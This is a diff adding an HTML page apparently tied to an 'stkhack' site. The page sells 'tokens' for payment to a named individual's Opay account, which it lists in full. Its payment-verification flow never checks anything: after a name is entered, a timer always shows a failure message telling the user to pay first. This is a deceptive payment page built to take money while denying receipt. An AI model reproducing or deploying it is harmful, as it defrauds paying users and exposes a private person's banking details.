@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Token Purchase and Payment Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      padding: 20px;
+    }
+    h2 {
+      color: #333;
+    }
+    .button {
+      padding: 10px 20px;
+      margin: 10px;
+      cursor: pointer;
+      border: none;
+      background-color: #28a745;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+    .button-back {
+      background-color: #007bff;
+    }
+    .button-buy, .button-verify {
+      background-color: #dc3545;
+    }
+    .input-box {
+      padding: 10px;
+      font-size: 16px;
+      margin: 10px;
+      width: 80%;
+      max-width: 300px;
+    }
+    .token-info {
+      margin-bottom: 20px;
+    }
+    .payment-info {
+      margin-bottom: 20px;
+    }
+    /* Loading Circle */
+    .loading-circle {
+      border: 8px solid #f3f3f3; /* Light background */
+      border-top: 8px solid #3498db; /* Blue color */
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto;
+    }
+
+    /* Spin Animation */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Styles for the failure page */
+    .failure-container {
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .failure-icon {
+      font-size: 80px;
+      color: red;
+      margin-bottom: 20px;
+    }
+
+    .failure-message {
+      font-size: 24px;
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Page 1: Token Purchase -->
+<div id="tokenPurchasePage">
+  <h2>Pay To Get Token</h2>
+  <p>We charge 1 minute per token</p>
+
+  <div class="token-info">
+    <p>Buy Tokens:</p>
+    <p>10 tokens = #1500</p>
+    <p>20 tokens = #3000</p>
+    <p>50 tokens = #7000</p>
+    <p>100 tokens = #10,000</p>
+    <p>200 tokens = #18,000</p>
+    <p>500 tokens = #30,000</p>
+  </div>
+
+  <div>
+    <button class="button button-back" onclick="window.location.href='https://stkhack.github.io/Start/'">Back</button>
+    <button class="button button-buy" onclick="showPaymentPage()">Buy</button>
+  </div>
+</div>
+
+<!-- Page 2: Payment Details -->
+<div id="paymentPage" style="display:none;">
+  <h2>Bank: <img src="palmpay.png" alt="" style="width: 50px;"> Opay</h2>
+  <p>Account Number: 7025051784</p>
+  <p>Name:Promise Onyedika chokwuani </p>
+
+  <div class="payment-info">
+    <button class="button button-verify" onclick="showVerificationPage()">Verify Payment</button>
+    <button class="button button-back" onclick="showTokenPurchasePage()">Back</button>
+  </div>
+
+  <p>Make sure you have paid before verifying payment!</p>
+</div>
+
+<!-- Page 3: Payment Verification -->
+<div id="verificationPage" style="display:none;">
+  <h2>Payment Verification</h2>
+
+  <div>
+    <input class="input-box" type="text" placeholder="Name on Account" id="accountName">
+    <br>
+    <button class="button" onclick="verifyPayment()">Verify</button>
+    <button class="button button-back" onclick="showPaymentPage()">Back</button>
+  </div>
+</div>
+
+<!-- Verification Loading Page -->
+<div id="loadingPage" style="display:none;">
+  <div class="verification-container">
+    <div class="loading-circle"></div>
+    <p class="message">Don't leave the app, it could take 2 - 5 minutes to verify...</p>
+  </div>
+</div>
+
+<!-- Failure Page -->
+<div id="failurePage" style="display:none;">
+  <div class="failure-container">
+    <div class="failure-icon">❌</div>
+    <p class="failure-message">Failed to verify. please make payment before verifying.</p>
+    <button class="button button-back" onclick="showVerificationPage()">Back to Verification</button>
+  </div>
+</div>
+
+<script>
+  // Show Token Purchase Page
+  function showTokenPurchasePage() {
+    document.getElementById('tokenPurchasePage').style.display = 'block';
+    document.getElementById('paymentPage').style.display = 'none';
+    document.getElementById('verificationPage').style.display = 'none';
+    document.getElementById('loadingPage').style.display = 'none';
+    document.getElementById('failurePage').style.display = 'none';
+  }
+
+  // Show Payment Page
+  function showPaymentPage() {
+    document.getElementById('tokenPurchasePage').style.display = 'none';
+    document.getElementById('paymentPage').style.display = 'block';
+    document.getElementById('verificationPage').style.display = 'none';
+    document.getElementById('loadingPage').style.display = 'none';
+    document.getElementById('failurePage').style.display = 'none';
+  }
+
+  // Show Verification Page
+  function showVerificationPage() {
+    document.getElementById('tokenPurchasePage').style.display = 'none';
+    document.getElementById('paymentPage').style.display = 'none';
+    document.getElementById('verificationPage').style.display = 'block';
+    document.getElementById('loadingPage').style.display = 'none';
+    document.getElementById('failurePage').style.display = 'none';
+  }
+
+  // Verify Payment
+  function verifyPayment() {
+    const accountName = document.getElementById('accountName').value;
+    if (accountName.trim() === '') {  // Check if the input is empty
+      alert("Please enter the name on the account.");
+    } else {
+      showLoadingPage();
+    }
+  }
+
+  // Show Loading Page
+  function showLoadingPage() {
+    document.getElementById('tokenPurchasePage').style.display = 'none';
+    document.getElementById('paymentPage').style.display = 'none';
+    document.getElementById('verificationPage').style.display = 'none';
+    document.getElementById('loadingPage').style.display = 'block';
+    
+    // Redirect to failure page after 3 minutes (180000ms)
+    setTimeout(() => {
+      showFailurePage();
+    }, 30000);
+  }
+
+  // Show Failure Page
+  function showFailurePage() {
+    document.getElementById('loadingPage').style.display = 'none';
+    document.getElementById('failurePage').style.display = 'block';
+  }
+</script>
+
+</body>
+</html>
